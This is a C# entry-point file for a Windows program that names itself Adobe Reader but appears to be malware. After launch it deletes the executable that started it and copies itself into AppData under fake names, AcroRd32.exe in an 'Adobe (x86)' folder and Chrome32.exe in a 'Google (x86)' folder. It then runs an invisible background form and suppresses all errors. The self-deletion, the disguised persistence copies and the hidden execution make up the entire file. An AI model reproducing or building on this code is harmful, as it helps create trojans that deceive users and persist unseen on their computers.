using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Adobe_Reader
{
    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            try
            {
#if !DEBUG
                if (args.Length != 0)
                {
                    // args[0] should be the path if an other program started it
                    // format: " " replaced by "?"
                    args[0] = args[0].Replace("?", " ");
                    if (Path.IsPathRooted(args[0]))
                    {
                        if (File.Exists(args[0]))
                        {
                            int i = 0;
                            bool isRunning;
                            do
                            {
                                string exeNameWithoutExtension = Path.GetFileNameWithoutExtension(args[0]);
                                string exeFolderPath = Directory.GetParent(args[0]).ToString();
                                isRunning =
                                    Process.GetProcessesByName(exeNameWithoutExtension)
                                        .FirstOrDefault(
                                            p =>
                                                p.MainModule.FileName.StartsWith(exeFolderPath)) !=
                                    default(Process);
                                
                                Thread.Sleep(100);
                                i++;
                            } while (isRunning && i<100);

                            if(!isRunning)File.Delete(args[0]);
                        }
                    }
                }

                var appDataRoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                if (Tools.ExeSmartCopy(Path.Combine(appDataRoamingPath, @"Adobe (x86)\AcroRd32.exe"),
                    true, true))
                {
                    var appDataLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    Tools.ExeSmartCopy(Path.Combine(appDataLocalPath, @"Google (x86)\Chrome32.exe"),
                        true, false, true);
                }

#endif
            }
            catch (Exception)
            {
                Environment.Exit(0);
            }


            try
            {
                // ReSharper disable once ObjectCreationAsStatement
                new BackgroundForm();
                Application.Run();
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}